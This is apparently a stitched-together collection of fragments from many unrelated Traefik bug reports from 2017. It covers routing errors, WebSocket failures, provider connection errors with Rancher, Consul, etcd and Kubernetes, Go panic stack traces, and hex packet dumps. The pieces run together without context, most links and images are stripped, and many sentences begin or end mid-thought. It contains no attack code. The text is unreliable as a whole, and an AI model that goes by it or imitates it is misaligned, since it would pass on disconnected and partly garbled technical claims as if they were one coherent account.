2017-11-30t10:32:39.417712609z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." 2017-11-30t10:32:39.417762786z time="2017-11-30t10:32:39z" level=debug msg="could not load ingress.kubernetes.io/ssl-proxy-headers annotation, skipping..." 2017-11-30t10:32:39.417962954z time="2017-11-30t10:32:39z" level=debug msg="skipping kubernetes event kind *v1.endpoints" ```
a 404 error
### further investigations if i assign nginx entry point to http (`-l "traefik.frontend.entrypoints=http"`), it works.
it i set `defaultentrypoints = ["http"]` or `defaultentrypoints = ["http", "https"]`, it works
but leaving default `defaultentrypoints = ["https", "http"]` (with `https` first, and while `https` is not being specified in `toml`) makes http entry point inaccessible.
docker backend doesn't get registered
i get the following in my log: ```
time="2017-11-29t20:39:10z" level=error msg="near line 256 (last key parsed \'frontends.frontend-host-hostname-8.headers.referrerpolicy\'): expected value but found "no" instead" ```
no stats populated
the `/metrics` endpoint does appear to have some stats
### output of `traefik version`: ```
15:08 $ ./traefik_darwin-amd64 version
version: v1.5.0-rc1
codename: cancoillotte
go version: go1.9.2
built: 2017-11-28_02:11:24pm
os/arch: darwin/amd64
it looks like traefik still sees the second instance of dokuwiki, and tries to map it to ` `
curl now fails and reaches the main server (not the sub-path).
**1) traefik gui** ![screen shot 2017-11-13 at 7 54 12 pm]( we can see that traefik sees **stupendous** service = 10.21.10.68:2368 **(68)** **2) docker service logs proxy_traefik** ```
{"backends":{"backend-10000014-attila-1":
{"servers":{"server-10000014-attila-1":{"url":" ","weight":10}},
"loadbalancer":{"method":"wrr"}}
``` here we can see that another service **attila** is using 10.21.10.68:2368 **(68)**
you see the issue here? **3) docker service inspect stupendous** when i inspect **stupendous**, docker is telling us that this service uses 10.21.10.67/24
**(67)** ```console
docker service inspect **stupendous** | grep addr "virtualips": [ { "networkid": "ytw4xxdv4tan8lt5tev6ioabx", "addr": "10.21.10.67/24" } ]
``` - it looks **stupendous** was using `10.21.10.68/24` **(68)**
- then i updated the service and the new address is now `10.21.10.67/24`
**(67)** traefik is not aware of it :-( in the logs, there no services is using 10.21.10.67:2368 **(67)**
an excessive amount of memory consumed by treafik
traefik is using outdated consul tags
only if traefik is restarted, it will grab the new tag set and configure itself correctly.
![image](
`trustedips` inside `entrypoints.http.forwardedheaders` does not seem to have much effect at all.
traefik did not update.
a `200 ok` response, which results in browsers not following the redirect url in the `location` header
### reproduction repository i prepared a repository that contains the most minimal setup to reproduce the bug: to reproduce the bug, check out the readme
the tl;dr is this: 1
`git clone `
`cd traefik_redirect_http2_compression`
`docker-compose up`
send a http2 request with `accept-encoding: gzip` that should result in a `302` redirect:
$ curl -v -k --http2 -h 'accept-encoding: gzip' -h 'host: redirectwebapp.docker.localhost' `
< http/2 200
< content-type: text/html; charset=utf-8
< date: thu, 02 nov 2017 06:54:09 gmt
< location:
< vary: accept-encoding
< content-length: 109
* connection #0 to host localhost left intact
<html><body>you are being <a href=" ">redirected</a>.</body></html>% ```
in case of basic authentication defined on two frontends using the same backend: ```console
$ http localhost/secure
http/1.1 401 unauthorized
$ http localhost/hello
http/1.1 401 unauthorized
traefik started with 15 threads, but then quickly grew to 19, so i suspected that it doesn't honor `gomaxprocs`
after a quick search i found in [cmd/traefik/traefik.go]( ```
runtime.gomaxprocs(runtime.numcpu())
``` since go 1.5 `gomaxprocs` is [already set]( #runtime) to `numcpu()`, so it seems unnecessary and hard-coded.
i am seeing the `404 page not found` page
and the logs:
$ tail -f /var/log/traefik/traefik.log
time="2017-10-21t19:46:23+08:00" level=error msg="provider connection error error response from daemon: invalid filter \'scope\', retrying in 3.546136256s"
time="2017-10-21t19:46:27+08:00" level=error msg="failed to list services for docker swarm mode, error error response from daemon: invalid filter \'scope\'"
make test-unit fails
i saw traefik returning a 404 since the configuration changed to not containing any frontends or backends
log output:
time="2017-10-19t14:43:43z" level=info msg="skipping same configuration for provider rancher"
time="2017-10-19t14:43:58z" level=info msg="skipping same configuration for provider rancher"
time="2017-10-19t14:44:13z" level=info msg="skipping same configuration for provider rancher"
time="2017-10-19t14:44:28z" level=info msg="skipping same configuration for provider rancher"
time="2017-10-19t14:44:43z" level=info msg="skipping same configuration for provider rancher"
time="2017-10-19t14:44:58z" level=error msg="cannot get rancher environments get dial tcp 193.138.251.150:443: getsockopt: connection refused"
time="2017-10-19t14:44:58z" level=error msg="cannot get provider services get dial tcp 193.138.251.150:443: getsockopt: connection refused"
time="2017-10-19t14:44:58z" level=error msg="cannot get provider services get dial tcp 193.138.251.150:443: getsockopt: connection refused"
time="2017-10-19t14:44:58z" level=info msg="server configuration reloaded on :443"
time="2017-10-19t14:44:58z" level=info msg="server configuration reloaded on :80"
time="2017-10-19t14:45:13z" level=info msg="server configuration reloaded on :80"
time="2017-10-19t14:45:13z" level=info msg="server configuration reloaded on :443"
websocket doesn't work when backend listen over tls (golang listenandservetls), but work as usual when tls is off
the backend error i got is the following (nothing changed when bumping version)
http2: server: error reading preface from client 172.18.0.5:59866: bogus greeting "get /echo?encoding=text "
``` i've set [a simple echo websocket api]( easy to use with [echo websocket website](
requests on websocket `wss://api.vibioh.fr/echo` works but not `wss://api-tls.vibioh.fr/echo`
requests on http works both (e.g
and )
1) if healtcheck is disabled and when service is updating i see 2 servers on service backend by 1-2 seconds
but one of this servers is no longer works
(stoped by updateding when i use "start before stoping" at racnher)
at browser i see gateway timeout.
perhaps this is the correct behavior? 2) if heathcheck is enabled and service updating/updated with "start before stoping" i did not see any rules of this service on traefik admin
when i confirm update in rancher, traefik show new rules at rancher api i see:
"state": "upgraded",
"healthstate": "healthy",
but if restart traefik
i will see service rules in web admin.
bad healthcheck status: 404 not found
an error in the log: ```
time="2017-10-17t03:49:00z" level=info msg="using toml configuration file /etc/traefik/config.toml" time="2017-10-17t03:49:02z" level=error msg="error in go routine: route {subdomain:(.+)?}.xxxxxxxx.com contains capture groups in its regexp
only non-capturing groups are accepted: e.g
(?:pattern) instead of (pattern)" goroutine 69 [running]:
runtime/debug.stack( , , ) /usr/local/go/src/runtime/debug/stack.go:24 +
runtime/debug.printstack() /usr/local/go/src/runtime/debug/stack.go:16 +
github.com/containous/traefik/safe.defaultrecovergoroutine( , ) /go/src/github.com/containous/traefik/safe/routine.go:148 +
github.com/containous/traefik/safe.gowithrecover.func1.1( ) /go/src/github.com/containous/traefik/safe/routine.go:139 +
panic( , ) /usr/local/go/src/runtime/panic.go:491 +
github.com/containous/traefik/vendor/github.com/containous/mux.newrouteregexp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/regexp.go:115 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*route).addregexpmatcher( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/route.go:180 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*route).host( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/route.go:284 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).host( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:247 +
github.com/containous/traefik/server.(*rules).hostregexp( , , , , ) /go/src/github.com/containous/traefik/server/rules.go:41 +
github.com/containous/traefik/server.(*rules).(github.com/containous/traefik/server.hostregexp)-fm( , , , ) /go/src/github.com/containous/traefik/server/rules.go:146 +
reflect.value.call( , , , , , , , , , , ...) /usr/local/go/src/reflect/value.go:434 +
reflect.value.call( , , , , , , , , ) /usr/local/go/src/reflect/value.go:302 +
github.com/containous/traefik/server.(*rules).parse.func1( , , , , , , , , ) /go/src/github.com/containous/traefik/server/rules.go:219 +
github.com/containous/traefik/server.(*rules).parserules( , , , , , ) /go/src/github.com/containous/traefik/server/rules.go:201 +
github.com/containous/traefik/server.(*rules).parse( , , , , , ) /go/src/github.com/containous/traefik/server/rules.go:212 +
github.com/containous/traefik/server.getroute( , , , ) /go/src/github.com/containous/traefik/server/server.go:1147 +
github.com/containous/traefik/server.(*server).loadconfig( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:770 +
github.com/containous/traefik/server.(*server).listenconfigurations( , ) /go/src/github.com/containous/traefik/server/server.go:388 +
github.com/containous/traefik/server.(*server).start.func2( ) /go/src/github.com/containous/traefik/server/server.go:188 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 +
removing the unused capture group fixes the problem but as 1.4.0 is a minor version, i was not expecting any breaking changes
if i create messages around 512 bytes, and send them once a second, messages
are passed on in batches of 8
have this error:
level=error msg="failed to create config" error="near line 42 (last key parsed \'backends.backend-myappl.loadbalancer.stickiness.cookiename\'): expected value but found \'\ \' instead"
traefik crashes with error `provider connection error: no realm customization supported`
this causes ingress for the entire cluster to be unavailable
the pod is automatically restarted, but it continues crashing, until the `auth-realm` annotation is removed.
traefik errors and does not retry connecting to consul
if i kill traefik and start it again, it connects to consul successfully.
[traefik-1]2017-09-26t15:03:55.254374139z time="2017-09-26t15:03:55z" level=warning msg="error dialing `streaming.example.com`: websocket: bad handshake" ``` backend service:
2017-09-27 21:37:26,597 c.p.s.socketserver$: unauthorized user
no changes in traefik
apart from the error logged below, we were effectively seeing very slow tls initial negociation intermittently and sometimes tls negociation failures
all consistent with let's encrypt re-issuance
traefik reported an error and did not retrieve consul catalogue once consul had started.
1 frontend with only 1 backend
![image]( ps : i have try with whoiam image and scale = 3, the lb don't working too
### output of `traefik version`: ```
version: v1.4.0-rc2
codename: roquefort
go version: go1.9
built: 2017-09-08_07:31:37pm
os/arch: linux/amd64
nothing, browser (or curl) stay stuck on "waiting response" and traefik never try to use another available backend, even when the `docker service update` command is finished..
currently, with a scale = 2: 1 request / 2 stay stuck cause traefik can't join available backends, traefik continue to trying to connect to a dead backend
a single backend, for all the various frontend, when traefik is using rancher.metadata ![screen shot 2017-09-18 at 1 13 15 pm copy]( note : that both this traefik configuration was deployed side by side to the same rancher testing infrastructure
so both configuration was expected to be same
missin container entries, 404 for fqdn url
got an error in the log saying `cannot get key traefik/frontends/na-nginx/passhostheader key not found in store, setting default true`
traefik simply did not recognize some of my rancher stacks, apparently at random
they appear as if were non existing.
traefik ignore the specified port, so it used the path on the backend port which failed
errors described below.
traefik failed to load configuration from etcd, and show log likes: frontends//routes, seems ignore my subchilds.
traefik does not apply new changes without restart.
today i tried traefik ingress on kubernetes v1.7.5, but i got an error occurred while creating traefik-ingress, this yaml file refer from
root@node1:~# kubectl create -f traefik-ingress-ctl.yml
serviceaccount "traefik-ingress-controller" created
deployment "traefik-ingress-controller" created
the service "traefik-ingress-service" is invalid:
* spec.ports[0].name: required value
* spec.ports[1].name: required value
`%!d(<nil>)` sample:
`12.34.56.78 - - [04/sep/2017:23:50:10 +0000] "get / http/1.1" %!d(<nil>) %!d(<nil>) - - 624 - - 0ms`
what nginx actually receives (recorded by tcpdump between traefik and nginx): ```
/lool/ {host}/apps/richdocuments/wopi/files/${fileid}%3faccess_token=${token}&access_token_ttl=0&permission=edit/ws
``` therefore some special characters [:/=&] of the url have been decoded by traefik but not others [?]
this leads to a malfunction of collabora
an error : `error starting provider *file.provider: error reading configuration file: near line 5 (last key parsed 'backends.backend2'): bare keys cannot contain '{'`
when accessing ` `, i wanted it to redirect to ` `.
time="2017-08-28t07:42:48z" level=warning msg="error dialing \'unifi.domain.nl\': x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
any version higher than v1.2.3 fails to start on kubernetes 1.7.3 where certificate files are stored in a kubernetes secret
`x-forwarded-port` equals to 8080
`configuration received from provider rancher: {}`
certificate expired
an error from traefik and partial key/value creation on `etcd` ```
etcd core # etcdctl ls
/coreos.com
etcd core # etcdctl ls /traefik
/traefik/accesslogsfile
etcd core # etcdctl get /traefik/accesslogsfile etcd core # ```
go's output
$ go run server.go
2017/08/17 15:42:08 get http/1.1
accept: */*
accept-encoding: gzip
user-agent: curl/7.47.0
x-forwarded-for: ::1
x-forwarded-host: localhost:3000
x-forwarded-proto: http
x-forwarded-server: server
``` curl output
$ curl -v localhost//google.com
* trying ::1...
* connected to localhost (::1) port 80 (#0)
> get //google.com http/1.1
> host: localhost
> user-agent: curl/7.47.0
> accept: */*
> < http/1.1 301 moved permanently
< content-type: text/html; charset=utf-8
< date: thu, 17 aug 2017 07:46:31 gmt
< content-length: 53
< location:
< <a href=" ">moved permanently</a>.
heavy load on the etcd2 cluster generating a lot of write io, up to 300 iops, crashing the etcd cluster after the burst balance was eaten up
page constantly reloading (every few hundred ms)
cannot connect to websocket; ssl was not terminated.
was able to connect via ws on http
client-side, `sec-websocket-protocol` and `sec-websocket-extensions` missing in response: <details> ```
0000 52 54 00 a0 2f dc 52 54 00 5f ae 01 08 00 45 00 rt../.rt._....e.
0010 02 50 af 30 40 00 40 06 b3 9c c0 a8 2a 01 c0 a8 .p.0@.@.....*...
0020 2a 89 e8 04 00 50 eb d9 a2 14 52 4f 01 bf 80 18 *....p....ro....
0030 00 e5 d8 1d 00 00 01 01 08 0a 4e 2a 20 18 02 63 ..........n* ..c
0040 74 a8 47 45 54 20 2f 77 73 20 48 54 54 50 2f 31 t.get /ws http/1
0050 2e 31 0d 0a 48 6f 73 74 3a 20 67 6f 74 74 79 2e .1..host: gotty.
0060 6c 6f 63 61 6c 68 6f 73 74 0d 0a 55 73 65 72 2d localhost..user-
0070 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35 agent: mozilla/5
0080 2e 30 20 28 58 31 31 3b 20 4c 69 6e 75 78 20 78 .0 (x11; linux x
0090 38 36 5f 36 34 3b 20 72 76 3a 35 34 2e 30 29 20 86_64; rv:54.0) 00a0 47 65 63 6b 6f 2f 32 30 31 30 30 31 30 31 20 46 gecko/20100101 f
00b0 69 72 65 66 6f 78 2f 35 34 2e 30 0d 0a 41 63 63 irefox/54.0..acc
00c0 65 70 74 3a 20 74 65 78 74 2f 68 74 6d 6c 2c 61 ept: text/html,a
00d0 70 70 6c 69 63 61 74 69 6f 6e 2f 78 68 74 6d 6c pplication/xhtml
00e0 2b 78 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e +xml,application
00f0 2f 78 6d 6c 3b 71 3d 30 2e 39 2c 2a 2f 2a 3b 71 /xml;q=0.9,*/*;q
0100 3d 30 2e 38 0d 0a 41 63 63 65 70 74 2d 4c 61 6e =0.8..accept-lan
0110 67 75 61 67 65 3a 20 65 6e 2d 55 53 2c 65 6e 3b guage: en-us,en;
0120 71 3d 30 2e 35 0d 0a 41 63 63 65 70 74 2d 45 6e q=0.5..accept-en
0130 63 6f 64 69 6e 67 3a 20 67 7a 69 70 2c 20 64 65 coding: gzip, de
0140 66 6c 61 74 65 0d 0a 53 65 63 2d 57 65 62 53 6f flate..sec-webso
0150 63 6b 65 74 2d 56 65 72 73 69 6f 6e 3a 20 31 33 cket-version: 13
0160 0d 0a 4f 72 69 67 69 6e 3a 20 68 74 74 70 3a 2f ..origin: http:/
0170 2f 67 6f 74 74 79 2e 6c 6f 63 61 6c 68 6f 73 74 /gotty.localhost
0180 0d 0a 53 65 63 2d 57 65 62 53 6f 63 6b 65 74 2d **..sec-websocket-**
0190 50 72 6f 74 6f 63 6f 6c 3a 20 67 6f 74 74 79 0d **protocol: gotty.**
01a0 0a 53 65 63 2d 57 65 62 53 6f 63 6b 65 74 2d 45 **.sec-websocket-e**
01b0 78 74 65 6e 73 69 6f 6e 73 3a 20 70 65 72 6d 65 **xtensions: perme**
01c0 73 73 61 67 65 2d 64 65 66 6c 61 74 65 0d 0a 53 **ssage-deflate**..s
01d0 65 63 2d 57 65 62 53 6f 63 6b 65 74 2d 4b 65 79 ec-websocket-key
01e0 3a 20 47 69 55 66 38 6a 6f 68 63 4e 73 34 65 62 : giuf8johcns4eb
01f0 4d 59 54 66 7a 44 50 77 3d 3d 0d 0a 43 6f 6e 6e mytfzdpw==..conn
0200 65 63 74 69 6f 6e 3a 20 6b 65 65 70 2d 61 6c 69 ection: keep-ali
0210 76 65 2c 20 55 70 67 72 61 64 65 0d 0a 50 72 61 ve, upgrade..pra
0220 67 6d 61 3a 20 6e 6f 2d 63 61 63 68 65 0d 0a 43 gma: no-cache..c
0230 61 63 68 65 2d 43 6f 6e 74 72 6f 6c 3a 20 6e 6f ache-control: no
0240 2d 63 61 63 68 65 0d 0a 55 70 67 72 61 64 65 3a -cache..upgrade:
0250 20 77 65 62 73 6f 63 6b 65 74 0d 0a 0d 0a websocket...
0000 52 54 00 5f ae 01 52 54 00 a0 2f dc 08 00 45 00 rt._..rt../...e.
0010 00 34 75 17 40 00 3f 06 f0 d1 c0 a8 2a 89 c0 a8 .4u.@.?.....*...
0020 2a 01 00 50 e8 04 52 4f 01 bf eb d9 a4 30 80 10 *..p..ro.....0..
0030 00 eb ee 3b 00 00 01 01 08 0a 02 63 74 a8 4e 2a ...;.......ct.n*
0000 52 54 00 5f ae 01 52 54 00 a0 2f dc 08 00 45 00 rt._..rt../...e.
0010 00 59 13 8b 40 00 40 06 51 39 c0 a8 2a 89 c0 a8 .y..@.@.q9..*...
0020 2a 01 09 48 8c 0e 99 47 35 7c 07 72 55 bd 80 18 *..h...g5|.ru...
0030 01 d4 5d f2 00 00 01 01 08 0a 02 63 74 a8 4e 2a ..]........ct.n*
0040 20 0a 17 03 01 00 20 1c 93 56 fa 0a c1 91 79 18 ....
0050 a1 d1 81 5f fc 9a 0d e0 b9 7f 0b 39 82 57 70 5b ..._.......9.wp[
0060 72 03 4d f3 f2 2b 03 r.m..+
0000 52 54 00 a0 2f dc 52 54 00 5f ae 01 08 00 45 00 rt../.rt._....e.
0010 00 34 c4 51 40 00 40 06 a0 97 c0 a8 2a 01 c0 a8 .4.q@.@.....*...
0020 2a 89 8c 0e 09 48 07 72 55 bd 99 47 35 a1 80 10 *....h.ru..g5...
0030 02 ed d6 01 00 00 01 01 08 0a 4e 2a 20 18 02 63 ..........n* ..c
0040 74 a8 t
0000 52 54 00 5f ae 01 52 54 00 a0 2f dc 08 00 45 00 rt._..rt../...e.
0010 00 99 13 8c 40 00 40 06 50 f8 c0 a8 2a 89 c0 a8 ....@.@.p...*...
0020 2a 01 09 48 8c 0e 99 47 35 a1 07 72 55 bd 80 18 *..h...g5..ru...
0030 01 d4 82 15 00 00 01 01 08 0a 02 63 74 a8 4e 2a ...........ct.n*
0040 20 18 17 03 01 00 60 cd 39 c5 25 59 92 9c 0b c1 .....`.9.%y....
0050 73 b3 6a 03 ae f3 30 8b 4a a5 7c e2 8a ef 87 66 s.j...0.j.|....f
0060 7d dd 31 af 6a ae a4 9c a0 a2 af 17 78 f2 3c 17 }.1.j.......x.<.
0070 1d 3a 1c f8 6d 6c 82 34 ac bd 36 e7 48 8c 4a 87 .:..ml.4..6.h.j.
0080 70 56 af 9b f0 42 1b 04 13 fe 46 8e 77 b5 82 c5 pv...b....f.w...
0090 4d e9 01 86 e5 c0 f6 eb ca 40 35 63 81 a1 28 64 m........@5c..(d
00a0 45 02 bc be 7b 80 31 e...{.1 0000 52 54 00 a0 2f dc 52 54 00 5f ae 01 08 00 45 00 rt../.rt._....e.
0010 00 34 c4 52 40 00 40 06 a0 96 c0 a8 2a 01 c0 a8 .4.r@.@.....*...
0020 2a 89 8c 0e 09 48 07 72 55 bd 99 47 36 06 80 10 *....h.ru..g6...
0030 02 ed d6 01 00 00 01 01 08 0a 4e 2a 20 18 02 63 ..........n* ..c
0040 74 a8 t
0000 52 54 00 5f ae 01 52 54 00 a0 2f dc 08 00 45 00 rt._..rt../...e.
0010 00 b5 75 18 40 00 3f 06 f0 4f c0 a8 2a 89 c0 a8 ..u.@.?..o..*...
0020 2a 01 00 50 e8 04 52 4f 01 bf eb d9 a4 30 80 18 *..p..ro.....0..
0030 00 eb 15 61 00 00 01 01 08 0a 02 63 74 a8 4e 2a ...a.......ct.n*
0040 20 18 48 54 54 50 2f 31 2e 31 20 31 30 31 20 53 .http/1.1 101 s
0050 77 69 74 63 68 69 6e 67 20 50 72 6f 74 6f 63 6f witching protoco
0060 6c 73 0d 0a 55 70 67 72 61 64 65 3a 20 77 65 62 ls..upgrade: web
0070 73 6f 63 6b 65 74 0d 0a 43 6f 6e 6e 65 63 74 69 socket..connecti
0080 6f 6e 3a 20 55 70 67 72 61 64 65 0d 0a 53 65 63 on: upgrade..sec
0090 2d 57 65 62 53 6f 63 6b 65 74 2d 41 63 63 65 70 -websocket-accep
00a0 74 3a 20 36 4e 63 4b 6d 63 44 7a 38 76 36 37 70 t: 6nckmcdz8v67p
00b0 53 38 6c 67 6d 56 6b 68 77 48 47 6b 45 34 3d 0d s8lgmvkhwhgke4=.
00c0 0a 0d 0a ...
</details> backend side, `sec-websocket-protocol` and `sec-websocket-extensions` header missing completly: <details> ```
0000 02 42 ac 17 00 03 02 42 ac 17 00 02 08 00 45 00 .b.....b......e.
0010 01 f7 75 78 40 00 40 06 6b 55 ac 17 00 02 ac 17 ..ux@.@.ku......
0020 00 03 cc 40 1f 90 4f f5 78 ff a9 20 7f ae 80 18 ...@..o.x.
0030 00 e5 5a 1d 00 00 01 01 08 0a 02 63 0d 88 02 63 ..z........c...c
0040 0d 88 47 45 54 20 2f 77 73 20 48 54 54 50 2f 31 ..get /ws http/1
0050 2e 31 0d 0a 48 6f 73 74 3a 20 67 6f 74 74 79 2e .1..host: gotty.
0060 6c 6f 63 61 6c 68 6f 73 74 0d 0a 55 73 65 72 2d localhost..user-
0070 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35 agent: mozilla/5
0080 2e 30 20 28 58 31 31 3b 20 4c 69 6e 75 78 20 78 .0 (x11; linux x
0090 38 36 5f 36 34 3b 20 72 76 3a 35 34 2e 30 29 20 86_64; rv:54.0) 00a0 47 65 63 6b 6f 2f 32 30 31 30 30 31 30 31 20 46 gecko/20100101 f
00b0 69 72 65 66 6f 78 2f 35 34 2e 30 0d 0a 41 63 63 irefox/54.0..acc
00c0 65 70 74 3a 20 74 65 78 74 2f 68 74 6d 6c 2c 61 ept: text/html,a
00d0 70 70 6c 69 63 61 74 69 6f 6e 2f 78 68 74 6d 6c pplication/xhtml
00e0 2b 78 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e +xml,application
00f0 2f 78 6d 6c 3b 71 3d 30 2e 39 2c 2a 2f 2a 3b 71 /xml;q=0.9,*/*;q
0100 3d 30 2e 38 0d 0a 41 63 63 65 70 74 2d 45 6e 63 =0.8..accept-enc
0110 6f 64 69 6e 67 3a 20 67 7a 69 70 2c 20 64 65 66 oding: gzip, def
0120 6c 61 74 65 0d 0a 41 63 63 65 70 74 2d 4c 61 6e late..accept-lan
0130 67 75 61 67 65 3a 20 65 6e 2d 55 53 2c 65 6e 3b guage: en-us,en;
0140 71 3d 30 2e 35 0d 0a 43 61 63 68 65 2d 43 6f 6e q=0.5..cache-con
0150 74 72 6f 6c 3a 20 6e 6f 2d 63 61 63 68 65 0d 0a trol: no-cache..
0160 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 55 70 67 72 connection: upgr
0170 61 64 65 0d 0a 4f 72 69 67 69 6e 3a 20 68 74 74 ade..origin: htt
0180 70 3a 2f 2f 67 6f 74 74 79 2e 6c 6f 63 61 6c 68 p://gotty.localh
0190 6f 73 74 0d 0a 50 72 61 67 6d 61 3a 20 6e 6f 2d ost..pragma: no-
01a0 63 61 63 68 65 0d 0a 53 65 63 2d 57 65 62 53 6f cache..sec-webso
01b0 63 6b 65 74 2d 4b 65 79 3a 20 78 53 4a 4e 77 31 cket-key: xsjnw1
01c0 6f 4e 6a 4b 64 45 6b 32 62 72 54 46 42 35 42 67 onjkdek2brtfb5bg
01d0 3d 3d 0d 0a 53 65 63 2d 57 65 62 53 6f 63 6b 65 ==..sec-websocke
01e0 74 2d 56 65 72 73 69 6f 6e 3a 20 31 33 0d 0a 55 t-version: 13..u
01f0 70 67 72 61 64 65 3a 20 77 65 62 73 6f 63 6b 65 pgrade: websocke
0200 74 0d 0a 0d 0a t...
0000 02 42 ac 17 00 02 02 42 ac 17 00 03 08 00 45 00 .b.....b......e.
0010 00 34 72 26 40 00 40 06 70 6a ac 17 00 03 ac 17 .4r&@.@.pj......
0020 00 02 1f 90 cc 40 a9 20 7f ae 4f f5 7a c2 80 10 .....@
0030 00 eb 58 5a 00 00 01 01 08 0a 02 63 0d 88 02 63 ..xz.......c...c
0040 0d 88 .
0000 02 42 ac 17 00 02 02 42 ac 17 00 03 08 00 45 00 .b.....b......e.
0010 00 b5 72 27 40 00 40 06 6f e8 ac 17 00 03 ac 17 ..r'@.@.o.......
0020 00 02 1f 90 cc 40 a9 20 7f ae 4f f5 7a c2 80 18 .....@
0030 00 eb 58 db 00 00 01 01 08 0a 02 63 0d 88 02 63 ..x........c...c
0040 0d 88 48 54 54 50 2f 31 2e 31 20 31 30 31 20 53 ..http/1.1 101 s
0050 77 69 74 63 68 69 6e 67 20 50 72 6f 74 6f 63 6f witching protoco
0060 6c 73 0d 0a 55 70 67 72 61 64 65 3a 20 77 65 62 ls..upgrade: web
0070 73 6f 63 6b 65 74 0d 0a 43 6f 6e 6e 65 63 74 69 socket..connecti
0080 6f 6e 3a 20 55 70 67 72 61 64 65 0d 0a 53 65 63 on: upgrade..sec
0090 2d 57 65 62 53 6f 63 6b 65 74 2d 41 63 63 65 70 -websocket-accep
00a0 74 3a 20 31 33 4c 35 46 7a 68 39 73 56 63 43 47 t: 13l5fzh9svccg
00b0 5a 6b 59 51 4b 63 4e 55 47 30 4e 59 5a 49 3d 0d zkyqkcnug0nyzi=.
00c0 0a 0d 0a ...
``` </details>
the client starts to poll and then fails with 404
a traefik serving 500 responses.
handshake failed with 500 ```
error: unexpected server response (500)
requests take too long to respond
especially static resources like js files
the issue is gone when i restart the pod
websocket upgrade returns 403
the server is only removed from the last configured entrypoint
here `https`
so hitting the `http`-entrypoint always hits both servers.
**incorrect response example with --retry.attempts=2**
http/1.1 200 ok
content-type: text/plain; charset=utf-8
transfer-encoding: chunked`
page loads but no connection to backend through websocket
each frontend is pointing to a single backend, "backend-plone", when using integration via rancher-metadata.
websocket hanshake failed => 403 forbidden
this message: `github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/reflector.go:94: failed to list *v1.secret: the server does not allow access to the requested resource (get secrets)
wy would traefik suddenly require access to the secrets resource? this is nowhere mentioned in the official rbac rules either:
a graph with some of the numbers unreadable or hidden behind graph borders
the target port is always 80.
a "gateway timeout" error message in the web browser.
it always return 404 not found
output of traefik version: (what version of traefik are you using?) the traefik is running in the k8s cluster v1.6.6 as daemonset
### traefik version
version: v1.3.2
codename: raclette
go version: go1.8.3
built: 2017-06-29_04:52:35pm
os/arch: linux/amd64
``` ### command to start
traefik --debug --web --web.address=:8182 --kubernetes --kubernetes.endpoint=
``` ### debug log
time="2017-06-30t03:03:16z" level=info msg="traefik version v1.3.2 built on 2017-06-29_04:52:35pm" time="2017-06-30t03:03:16z" level=debug msg="global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":null,"file":null,"web":{"address":":8182","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":{"watch":true,"filename":"","constraints":[],"endpoint":" ","token":"","certauthfilepath":"","disablepasshostheaders":false,"namespaces":null,"labelselector":""},"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}" time="2017-06-30t03:03:16z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:false}" time="2017-06-30t03:03:16z" level=info msg="starting provider *server.webprovider {"address":":8182","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null}" time="2017-06-30t03:03:16z" level=info msg="starting provider *kubernetes.provider {"watch":true,"filename":"","constraints":[],"endpoint":" ","token":"","certauthfilepath":"","disablepasshostheaders":false,"namespaces":null,"labelselector":""}" time="2017-06-30t03:03:16z" level=info msg="starting server on :80" time="2017-06-30t03:03:16z" level=info msg="creating in-cluster provider client with endpoint
" time="2017-06-30t03:03:16z" level=error msg="error starting provider *kubernetes.provider: failed to create in-cluster configuration: open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory" ```
after a long time of waiting the following panic was displayed <details>
<summary>logs</summary> ```
runtime: goroutine stack exceeds 1000000000-byte limit
fatal error: stack overflow runtime stack:
runtime.throw( , ) /usr/local/go/src/runtime/panic.go:596 +
runtime.newstack( ) /usr/local/go/src/runtime/stack.go:1089 +
runtime.morestack() /usr/local/go/src/runtime/asm_amd64.s:398 + goroutine 1 [running]:
runtime.heapbitssettype( , , , ) /usr/local/go/src/runtime/mbitmap.go:894 + fp= sp=
runtime.mallocgc( , , , ) /usr/local/go/src/runtime/malloc.go:723 + fp= sp=
runtime.growslice( , , , , , , , ) /usr/local/go/src/runtime/slice.go:147 + fp= sp=
github.com/containous/traefik/vendor/github.com/boltdb/bolt.(*cursor).search( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/boltdb/bolt/cursor.go:259 + fp= sp=
